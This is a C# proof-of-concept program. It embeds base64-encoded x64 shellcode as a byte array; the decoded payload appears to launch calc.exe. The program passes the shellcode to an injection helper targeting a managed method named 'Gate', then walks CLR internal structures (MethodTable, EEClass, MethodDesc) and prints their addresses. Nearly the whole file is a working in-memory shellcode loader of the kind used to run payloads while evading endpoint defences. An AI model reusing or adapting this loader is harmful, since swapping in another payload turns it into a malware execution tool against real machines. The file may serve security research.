using System;
using System.Runtime.InteropServices;
using System.Threading;
using System.Diagnostics;
using System.Text;
using System.Net;
using System.Reflection;
using System.Linq;
namespace DotNet
{
    public class Program
    {
        public static void Main()
        {
            byte[] bytes = new byte[368]
            {
                0x2f,0x45,0x69,0x44,0x35,0x50,
                0x44,0x6f,0x77,0x41,0x41,0x41,0x41,0x45,0x46,0x52,0x51,0x56,
                0x42,0x53,0x55,0x56,0x5a,0x49,0x4d,0x64,0x4a,0x6c,0x53,0x49,
                0x74,0x53,0x59,0x45,0x69,0x4c,0x55,0x68,0x68,0x49,0x69,0x31,
                0x49,0x67,0x53,0x49,0x74,0x79,0x55,0x45,0x67,0x50,0x74,0x30,
                0x70,0x4b,0x54,0x54,0x48,0x4a,0x53,0x44,0x48,0x41,0x72,0x44,
                0x78,0x68,0x66,0x41,0x49,0x73,0x49,0x45,0x48,0x42,0x79,0x51,
                0x31,0x42,0x41,0x63,0x48,0x69,0x37,0x56,0x4a,0x42,0x55,0x55,
                0x69,0x4c,0x55,0x69,0x43,0x4c,0x51,0x6a,0x78,0x49,0x41,0x64,
                0x43,0x4c,0x67,0x49,0x67,0x41,0x41,0x41,0x42,0x49,0x68,0x63,
                0x42,0x30,0x5a,0x30,0x67,0x42,0x30,0x46,0x43,0x4c,0x53,0x42,
                0x68,0x45,0x69,0x30,0x41,0x67,0x53,0x51,0x48,0x51,0x34,0x31,
                0x5a,0x49,0x2f,0x38,0x6c,0x42,0x69,0x7a,0x53,0x49,0x53,0x41,
                0x48,0x57,0x54,0x54,0x48,0x4a,0x53,0x44,0x48,0x41,0x72,0x45,
                0x48,0x42,0x79,0x51,0x31,0x42,0x41,0x63,0x45,0x34,0x34,0x48,
                0x58,0x78,0x54,0x41,0x4e,0x4d,0x4a,0x41,0x68,0x46,0x4f,0x64,
                0x46,0x31,0x32,0x46,0x68,0x45,0x69,0x30,0x41,0x6b,0x53,0x51,
                0x48,0x51,0x5a,0x6b,0x47,0x4c,0x44,0x45,0x68,0x45,0x69,0x30,
                0x41,0x63,0x53,0x51,0x48,0x51,0x51,0x59,0x73,0x45,0x69,0x45,
                0x67,0x42,0x30,0x45,0x46,0x59,0x51,0x56,0x68,0x65,0x57,0x56,
                0x70,0x42,0x57,0x45,0x46,0x5a,0x51,0x56,0x70,0x49,0x67,0x2b,
                0x77,0x67,0x51,0x56,0x4c,0x2f,0x34,0x46,0x68,0x42,0x57,0x56,
                0x70,0x49,0x69,0x78,0x4c,0x70,0x56,0x2f,0x2f,0x2f,0x2f,0x31,
                0x31,0x49,0x75,0x67,0x45,0x41,0x41,0x41,0x41,0x41,0x41,0x41,
                0x41,0x41,0x53,0x49,0x32,0x4e,0x41,0x51,0x45,0x41,0x41,0x45,
                0x47,0x36,0x4d,0x59,0x74,0x76,0x68,0x2f,0x2f,0x56,0x75,0x2b,
                0x41,0x64,0x4b,0x67,0x70,0x42,0x75,0x71,0x61,0x56,0x76,0x5a,
                0x33,0x2f,0x31,0x55,0x69,0x44,0x78,0x43,0x67,0x38,0x42,0x6e,
                0x77,0x4b,0x67,0x50,0x76,0x67,0x64,0x51,0x57,0x37,0x52,0x78,
                0x4e,0x79,0x62,0x32,0x6f,0x41,0x57,0x55,0x47,0x4a,0x32,0x76,
                0x2f,0x56,0x59,0x32,0x46,0x73,0x59,0x79,0x35,0x6c,0x65,0x47,
                0x55,0x41
            };
            dll ntdll = new dll();
            string base64Str = Encoding.ASCII.GetString(bytes);
            Utils.inject(base64Str, ntdll);

            MethodInfo balls = typeof(dll).GetMethod(nameof(dll.Gate), BindingFlags.Static | BindingFlags.Public);
            Type t = typeof(dll);
            Structs.Internals.MethodTable mt = (Structs.Internals.MethodTable)Marshal.PtrToStructure(t.TypeHandle.Value, typeof(Structs.Internals.MethodTable));
            Structs.Internals.EEClass ec = (Structs.Internals.EEClass)Marshal.PtrToStructure(mt.m_pEEClass, typeof(Structs.Internals.EEClass));
            Structs.Internals.MethodDescChunk mdc = (Structs.Internals.MethodDescChunk)Marshal.PtrToStructure(ec.m_pChunks, typeof(Structs.Internals.MethodDescChunk)); //difference
            Structs.Internals.MethodDesc md = (Structs.Internals.MethodDesc)Marshal.PtrToStructure(IntPtr.Add(ec.m_pChunks, 0x18), typeof(Structs.Internals.MethodDesc)); //difference
            MethodInfo a = typeof(dll).GetMethod(nameof(dll.Gate), BindingFlags.Static | BindingFlags.Public);

            Console.WriteLine("Method Table of dll class location: 0x{0:X}", (long)t.TypeHandle.Value);
            Console.WriteLine("Method Table m_dwFlags: 0x{0:X}", mt.m_dwFlags);
            Console.WriteLine("Method Table m_BaseSize: 0x{0:X}", mt.m_BaseSize);
            Console.WriteLine("Method Table m_wFlags2: 0x{0:X}", mt.m_wFlags2);
            Console.WriteLine("Method Table m_wToken: 0x{0:X}", mt.m_wToken);
            Console.WriteLine("Method Table m_wNumVirtuals: 0x{0:X}", mt.m_wNumVirtuals);
            Console.WriteLine("Method Table m_wNumInterfaces: 0x{0:X}", mt.m_wNumInterfaces);
            Console.WriteLine("Method Table m_pParentMethodTable: 0x{0:X}", (long)mt.m_pParentMethodTable);
            Console.WriteLine("Method Table m_pLoaderModule: 0x{0:X}", (long)mt.m_pLoaderModule);
            Console.WriteLine("Method Table m_pWriteableData: 0x{0:X}", (long)mt.m_pWriteableData);
            Console.WriteLine("Method Table m_pEEClass: 0x{0:X}", (long)mt.m_pEEClass);
            Console.WriteLine("Method Table m_pPerInstInfo: 0x{0:X}", (long)mt.m_pPerInstInfo);
            Console.WriteLine("Method Table m_pInterfaceMap: 0x{0:X}", (long)mt.m_pInterfaceMap);

            Console.WriteLine("Gate Location: 0x{0:X}", (long)typeof(dll).GetMethod(nameof(dll.Gate), BindingFlags.Public | BindingFlags.Static).MethodHandle.GetFunctionPointer());

        }
    }
}
